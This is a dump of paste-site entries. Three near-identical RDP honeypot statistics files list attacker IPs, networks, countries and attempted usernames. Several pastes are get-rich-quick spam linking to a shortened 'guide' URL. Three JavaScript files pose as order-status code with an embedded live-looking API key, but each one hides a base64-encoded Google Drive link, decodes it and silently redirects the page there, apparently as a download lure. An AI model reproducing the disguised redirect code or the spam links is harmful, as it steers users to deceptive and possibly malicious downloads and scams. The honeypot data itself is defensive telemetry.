id,title,username,language,date,content
wk5b0b0y,2025-04-08_stats.json,rdp_snitch,JSON,Wednesday 9th of April 2025 07:18:33 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 59358,
    ""150.95.89.149"": 7971,
    ""84.17.45.14"": 999,
    ""15.204.41.136"": 16785,
    ""156.146.57.174"": 8037,
    ""156.146.57.110"": 32190,
    ""150.95.30.49"": 15891,
    ""156.146.57.52"": 8049,
    ""146.190.105.191"": 2649,
    ""147.182.229.114"": 585,
    ""106.14.144.233"": 426,
    ""191.96.106.23"": 3618,
    ""92.255.85.92"": 24,
    ""198.235.24.86"": 9,
    ""157.245.104.150"": 3,
    ""200.159.243.250"": 2076,
    ""80.94.95.90"": 12,
    ""205.210.31.86"": 9,
    ""92.53.12.65"": 3,
    ""91.238.181.96"": 6,
    ""178.20.129.235"": 6,
    ""88.214.25.123"": 6,
    ""103.97.93.115"": 9,
    ""205.210.31.180"": 9,
    ""194.180.48.89"": 3,
    ""45.227.254.132"": 9,
    ""58.218.199.219"": 12,
    ""199.45.155.95"": 3,
    ""165.154.138.151"": 3,
    ""198.235.24.178"": 9
  },
  ""asn"": {
    ""AS60068"": 60357,
    ""AS135161"": 23862,
    ""AS16276"": 16785,
    ""AS212238"": 48276,
    ""AS14061"": 3237,
    ""AS37963"": 426,
    ""AS174"": 3618,
    ""AS207566"": 24,
    ""AS396982"": 36,
    ""AS1916"": 2076,
    ""AS204428"": 12,
    ""AS43612"": 3,
    ""AS49434"": 6,
    ""AS24810"": 6,
    ""AS35042"": 6,
    ""AS134053"": 9,
    ""AS201814"": 3,
    ""AS267784"": 9,
    ""AS4134"": 12,
    ""AS398722"": 3,
    ""AS135377"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 59358,
    ""GMO-Z.COM PTE. LTD."": 23862,
    ""Datacamp Limited"": 49275,
    ""OVH SAS"": 16785,
    ""DigitalOcean, LLC"": 3237,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Cogent Communications"": 3618,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Google LLC"": 36,
    ""Rede Nacional de Ensino e Pesquisa"": 2076,
    ""SS-Net"": 12,
    ""CableTEL DOOEL Macedonia Veles Triple Play"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""Teleset LLC Nchelny Branch"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 9,
    ""MEVSPACE sp. z o.o."": 3,
    ""Flyservers S.A."": 9,
    ""Chinanet"": 12,
    ""Censys, Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 59358,
    ""Zcom Thai"": 23862,
    ""Cdn77 LAX CS2"": 999,
    ""OVH US LLC"": 16785,
    ""Datacamp Limited"": 48276,
    ""DigitalOcean, LLC"": 3237,
    ""Aliyun Computing Co., LTD"": 426,
    ""Ipxo"": 3618,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Palo Alto Networks, Inc"": 36,
    ""Associa\u00e7\u00e3o Rede Nacional de Ensino e Pesquisa"": 2076,
    ""Unmanaged LTD"": 12,
    ""Global Communication Net EAD"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Teleset LLC"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 9,
    ""HostSlick"": 3,
    ""Xwin Universal LTD"": 9,
    ""Chinanet JS"": 12,
    ""Censys, Inc."": 3,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""North West"": 107634,
    ""Tokyo"": 7971,
    ""California"": 5238,
    ""Oregon"": 16785,
    ""Bangkok"": 15891,
    ""South West"": 2649,
    ""Shanghai"": 426,
    ""Moscow"": 24,
    ""Karnataka"": 3,
    ""Rio de Janeiro"": 2076,
    ""Sofia-Capital"": 12,
    ""Karposh"": 3,
    ""\u00cele-de-France"": 6,
    ""Tatarstan Republic"": 6,
    ""Kowloon City"": 6,
    ""Goa"": 9,
    ""Bavaria"": 3,
    ""Vilnius"": 9,
    ""Jiangsu"": 12,
    ""Kowloon"": 3,
    ""Hesse"": 3
  },
  ""country"": {
    ""Singapore"": 110283,
    ""Japan"": 7971,
    ""United States"": 22023,
    ""Thailand"": 15891,
    ""China"": 438,
    ""Russia"": 30,
    ""India"": 12,
    ""Brazil"": 2076,
    ""Bulgaria"": 12,
    ""North Macedonia"": 3,
    ""France"": 6,
    ""Hong Kong"": 9,
    ""Germany"": 6,
    ""Lithuania"": 9
  },
  ""account"": {
    ""hello"": 158664,
    ""Test"": 24,
    ""PhkJRMslo"": 3,
    ""gvOOtw"": 3,
    ""wRGfRT"": 3,
    ""Administr"": 15,
    ""lLGsjtOJy"": 3,
    ""afQBEA"": 3,
    ""gtmHLX"": 3,
    ""(empty)"": 6,
    ""Domain"": 21,
    ""ALMxKnLYm"": 3,
    ""vZsoym"": 3,
    ""mzaZgr"": 3,
    ""Administrator"": 3,
    ""dfEBqQhqA"": 3,
    ""SKFIPM"": 3,
    ""DJvDXt"": 3
  },
  ""keyboard"": {
    ""Unknown"": 158769
  },
  ""client_build"": {
    ""Unknown"": 158769
  },
  ""client_name"": {
    ""Unknown"": 158769
  },
  ""ip_type"": {
    ""hosting & proxy"": 112296,
    ""hosting"": 40692,
    ""proxy"": 3654,
    ""Unknown"": 2124,
    ""mobile"": 3
  }
}"
Ui7WpWGu,2025-04-08_stats.json,rdp_snitch,JSON,Wednesday 9th of April 2025 07:16:24 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 59357,
    ""150.95.89.149"": 7970,
    ""84.17.45.14"": 999,
    ""15.204.41.136"": 16785,
    ""156.146.57.174"": 8037,
    ""156.146.57.110"": 32190,
    ""150.95.30.49"": 15891,
    ""156.146.57.52"": 8049,
    ""146.190.105.191"": 2649,
    ""147.182.229.114"": 585,
    ""106.14.144.233"": 426,
    ""191.96.106.23"": 3618,
    ""92.255.85.92"": 24,
    ""198.235.24.86"": 9,
    ""157.245.104.150"": 3,
    ""200.159.243.250"": 2076,
    ""80.94.95.90"": 12,
    ""205.210.31.86"": 9,
    ""92.53.12.65"": 3,
    ""91.238.181.96"": 6,
    ""178.20.129.235"": 6,
    ""88.214.25.123"": 6,
    ""103.97.93.115"": 9,
    ""205.210.31.180"": 9,
    ""194.180.48.89"": 3,
    ""45.227.254.132"": 9,
    ""58.218.199.219"": 12,
    ""199.45.155.95"": 3,
    ""165.154.138.151"": 3,
    ""198.235.24.178"": 9
  },
  ""asn"": {
    ""AS60068"": 60356,
    ""AS135161"": 23861,
    ""AS16276"": 16785,
    ""AS212238"": 48276,
    ""AS14061"": 3237,
    ""AS37963"": 426,
    ""AS174"": 3618,
    ""AS207566"": 24,
    ""AS396982"": 36,
    ""AS1916"": 2076,
    ""AS204428"": 12,
    ""AS43612"": 3,
    ""AS49434"": 6,
    ""AS24810"": 6,
    ""AS35042"": 6,
    ""AS134053"": 9,
    ""AS201814"": 3,
    ""AS267784"": 9,
    ""AS4134"": 12,
    ""AS398722"": 3,
    ""AS135377"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 59357,
    ""GMO-Z.COM PTE. LTD."": 23861,
    ""Datacamp Limited"": 49275,
    ""OVH SAS"": 16785,
    ""DigitalOcean, LLC"": 3237,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Cogent Communications"": 3618,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Google LLC"": 36,
    ""Rede Nacional de Ensino e Pesquisa"": 2076,
    ""SS-Net"": 12,
    ""CableTEL DOOEL Macedonia Veles Triple Play"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""Teleset LLC Nchelny Branch"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 9,
    ""MEVSPACE sp. z o.o."": 3,
    ""Flyservers S.A."": 9,
    ""Chinanet"": 12,
    ""Censys, Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 59357,
    ""Zcom Thai"": 23861,
    ""Cdn77 LAX CS2"": 999,
    ""OVH US LLC"": 16785,
    ""Datacamp Limited"": 48276,
    ""DigitalOcean, LLC"": 3237,
    ""Aliyun Computing Co., LTD"": 426,
    ""Ipxo"": 3618,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Palo Alto Networks, Inc"": 36,
    ""Associa\u00e7\u00e3o Rede Nacional de Ensino e Pesquisa"": 2076,
    ""Unmanaged LTD"": 12,
    ""Global Communication Net EAD"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Teleset LLC"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 9,
    ""HostSlick"": 3,
    ""Xwin Universal LTD"": 9,
    ""Chinanet JS"": 12,
    ""Censys, Inc."": 3,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""North West"": 107633,
    ""Tokyo"": 7970,
    ""California"": 5238,
    ""Oregon"": 16785,
    ""Bangkok"": 15891,
    ""South West"": 2649,
    ""Shanghai"": 426,
    ""Moscow"": 24,
    ""Karnataka"": 3,
    ""Rio de Janeiro"": 2076,
    ""Sofia-Capital"": 12,
    ""Karposh"": 3,
    ""\u00cele-de-France"": 6,
    ""Tatarstan Republic"": 6,
    ""Kowloon City"": 6,
    ""Goa"": 9,
    ""Bavaria"": 3,
    ""Vilnius"": 9,
    ""Jiangsu"": 12,
    ""Kowloon"": 3,
    ""Hesse"": 3
  },
  ""country"": {
    ""Singapore"": 110282,
    ""Japan"": 7970,
    ""United States"": 22023,
    ""Thailand"": 15891,
    ""China"": 438,
    ""Russia"": 30,
    ""India"": 12,
    ""Brazil"": 2076,
    ""Bulgaria"": 12,
    ""North Macedonia"": 3,
    ""France"": 6,
    ""Hong Kong"": 9,
    ""Germany"": 6,
    ""Lithuania"": 9
  },
  ""account"": {
    ""hello"": 158662,
    ""Test"": 24,
    ""PhkJRMslo"": 3,
    ""gvOOtw"": 3,
    ""wRGfRT"": 3,
    ""Administr"": 15,
    ""lLGsjtOJy"": 3,
    ""afQBEA"": 3,
    ""gtmHLX"": 3,
    ""(empty)"": 6,
    ""Domain"": 21,
    ""ALMxKnLYm"": 3,
    ""vZsoym"": 3,
    ""mzaZgr"": 3,
    ""Administrator"": 3,
    ""dfEBqQhqA"": 3,
    ""SKFIPM"": 3,
    ""DJvDXt"": 3
  },
  ""keyboard"": {
    ""Unknown"": 158767
  },
  ""client_build"": {
    ""Unknown"": 158767
  },
  ""client_name"": {
    ""Unknown"": 158767
  },
  ""ip_type"": {
    ""hosting & proxy"": 112295,
    ""hosting"": 40691,
    ""proxy"": 3654,
    ""Unknown"": 2124,
    ""mobile"": 3
  }
}"
4Vde6emM,2025-04-08_stats.json,rdp_snitch,JSON,Wednesday 9th of April 2025 07:15:15 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 59356,
    ""150.95.89.149"": 7969,
    ""84.17.45.14"": 999,
    ""15.204.41.136"": 16785,
    ""156.146.57.174"": 8037,
    ""156.146.57.110"": 32190,
    ""150.95.30.49"": 15891,
    ""156.146.57.52"": 8049,
    ""146.190.105.191"": 2649,
    ""147.182.229.114"": 585,
    ""106.14.144.233"": 426,
    ""191.96.106.23"": 3618,
    ""92.255.85.92"": 24,
    ""198.235.24.86"": 9,
    ""157.245.104.150"": 3,
    ""200.159.243.250"": 2076,
    ""80.94.95.90"": 12,
    ""205.210.31.86"": 9,
    ""92.53.12.65"": 3,
    ""91.238.181.96"": 6,
    ""178.20.129.235"": 6,
    ""88.214.25.123"": 6,
    ""103.97.93.115"": 9,
    ""205.210.31.180"": 9,
    ""194.180.48.89"": 3,
    ""45.227.254.132"": 9,
    ""58.218.199.219"": 12,
    ""199.45.155.95"": 3,
    ""165.154.138.151"": 3,
    ""198.235.24.178"": 9
  },
  ""asn"": {
    ""AS60068"": 60355,
    ""AS135161"": 23860,
    ""AS16276"": 16785,
    ""AS212238"": 48276,
    ""AS14061"": 3237,
    ""AS37963"": 426,
    ""AS174"": 3618,
    ""AS207566"": 24,
    ""AS396982"": 36,
    ""AS1916"": 2076,
    ""AS204428"": 12,
    ""AS43612"": 3,
    ""AS49434"": 6,
    ""AS24810"": 6,
    ""AS35042"": 6,
    ""AS134053"": 9,
    ""AS201814"": 3,
    ""AS267784"": 9,
    ""AS4134"": 12,
    ""AS398722"": 3,
    ""AS135377"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 59356,
    ""GMO-Z.COM PTE. LTD."": 23860,
    ""Datacamp Limited"": 49275,
    ""OVH SAS"": 16785,
    ""DigitalOcean, LLC"": 3237,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Cogent Communications"": 3618,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Google LLC"": 36,
    ""Rede Nacional de Ensino e Pesquisa"": 2076,
    ""SS-Net"": 12,
    ""CableTEL DOOEL Macedonia Veles Triple Play"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""Teleset LLC Nchelny Branch"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 9,
    ""MEVSPACE sp. z o.o."": 3,
    ""Flyservers S.A."": 9,
    ""Chinanet"": 12,
    ""Censys, Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 59356,
    ""Zcom Thai"": 23860,
    ""Cdn77 LAX CS2"": 999,
    ""OVH US LLC"": 16785,
    ""Datacamp Limited"": 48276,
    ""DigitalOcean, LLC"": 3237,
    ""Aliyun Computing Co., LTD"": 426,
    ""Ipxo"": 3618,
    ""Chang Way Technologies Co. Limited"": 24,
    ""Palo Alto Networks, Inc"": 36,
    ""Associa\u00e7\u00e3o Rede Nacional de Ensino e Pesquisa"": 2076,
    ""Unmanaged LTD"": 12,
    ""Global Communication Net EAD"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Teleset LLC"": 6,
    ""Ethernet Xpress Pvt. Ltd."": 9,
    ""HostSlick"": 3,
    ""Xwin Universal LTD"": 9,
    ""Chinanet JS"": 12,
    ""Censys, Inc."": 3,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""North West"": 107632,
    ""Tokyo"": 7969,
    ""California"": 5238,
    ""Oregon"": 16785,
    ""Bangkok"": 15891,
    ""South West"": 2649,
    ""Shanghai"": 426,
    ""Moscow"": 24,
    ""Karnataka"": 3,
    ""Rio de Janeiro"": 2076,
    ""Sofia-Capital"": 12,
    ""Karposh"": 3,
    ""\u00cele-de-France"": 6,
    ""Tatarstan Republic"": 6,
    ""Kowloon City"": 6,
    ""Goa"": 9,
    ""Bavaria"": 3,
    ""Vilnius"": 9,
    ""Jiangsu"": 12,
    ""Kowloon"": 3,
    ""Hesse"": 3
  },
  ""country"": {
    ""Singapore"": 110281,
    ""Japan"": 7969,
    ""United States"": 22023,
    ""Thailand"": 15891,
    ""China"": 438,
    ""Russia"": 30,
    ""India"": 12,
    ""Brazil"": 2076,
    ""Bulgaria"": 12,
    ""North Macedonia"": 3,
    ""France"": 6,
    ""Hong Kong"": 9,
    ""Germany"": 6,
    ""Lithuania"": 9
  },
  ""account"": {
    ""hello"": 158660,
    ""Test"": 24,
    ""PhkJRMslo"": 3,
    ""gvOOtw"": 3,
    ""wRGfRT"": 3,
    ""Administr"": 15,
    ""lLGsjtOJy"": 3,
    ""afQBEA"": 3,
    ""gtmHLX"": 3,
    ""(empty)"": 6,
    ""Domain"": 21,
    ""ALMxKnLYm"": 3,
    ""vZsoym"": 3,
    ""mzaZgr"": 3,
    ""Administrator"": 3,
    ""dfEBqQhqA"": 3,
    ""SKFIPM"": 3,
    ""DJvDXt"": 3
  },
  ""keyboard"": {
    ""Unknown"": 158765
  },
  ""client_build"": {
    ""Unknown"": 158765
  },
  ""client_name"": {
    ""Unknown"": 158765
  },
  ""ip_type"": {
    ""hosting & proxy"": 112294,
    ""hosting"": 40690,
    ""proxy"": 3654,
    ""Unknown"": 2124,
    ""mobile"": 3
  }
}"
rb57Fs4b,EARN $900 INSTANTLY 2025⭐ G8,14k_dfdf25,JavaScript,Wednesday 9th of April 2025 07:13:15 PM CDT," 
Pdf https://tinyurl.com/privguidee


xQPy8UyKT7
"
H16kSs30,Make $1000 15-MINUTES  (BEGINNER) HV,14k_dfdf25,JavaScript,Wednesday 9th of April 2025 06:59:47 PM CDT," 
Pdf https://tinyurl.com/privguidee


GNVuGmh4h2
"
zbYtGqrd,Products.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 06:56:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18593/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vtMvi9cW,EARN $900 INSTANTLY 2025 2U,14k_dfdf25,JavaScript,Wednesday 9th of April 2025 06:46:22 PM CDT," 
Pdf https://tinyurl.com/privguidee


JrYBVkZcoR
"
VBCmkQKE,Order.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 06:40:58 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17256/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
J9rNx5KL,Make $1000 15-MINUTES (BEGINNER) FM,14k_dfdf25,JavaScript,Wednesday 9th of April 2025 06:32:56 PM CDT," 
Pdf https://tinyurl.com/privguidee


yQPfmyW7J5
"
NSGizqrC,Market.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 06:25:35 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55221/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
